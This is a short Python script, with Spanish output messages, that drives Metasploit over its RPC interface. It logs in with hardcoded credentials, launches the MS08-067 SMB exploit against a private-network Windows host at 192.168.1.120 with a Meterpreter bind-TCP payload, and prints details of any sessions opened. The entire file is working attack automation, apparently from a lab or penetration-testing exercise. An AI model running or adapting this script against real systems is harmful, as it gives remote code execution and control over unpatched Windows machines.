from metasploit.msfrpc import MsfRpcClient
#import time

#msfrpcd -U msf -P test -f
cli = MsfRpcClient(username="msf", password="test")
lista = cli.modules.exploits
exploit = cli.modules.use('exploit', 'windows/smb/ms08_067_netapi')
exploit['RHOST'] = '192.168.1.120'
exploit.execute(payload='windows/meterpreter/bind_tcp')
#print cli.sessions.list
if not cli.sessions.list:
    print 'no hay sesiones activas aun'
else:
    sesiones = cli.sessions.list
    #print cli.sessions.list
    for ses in sesiones:
        print sesiones[ses]['info']
        print sesiones[ses]['via_exploit']
        print (sesiones[ses]['session_host'] + ":" +
            str(sesiones[ses]['session_port']))
        print "---------------------------------------------------------------"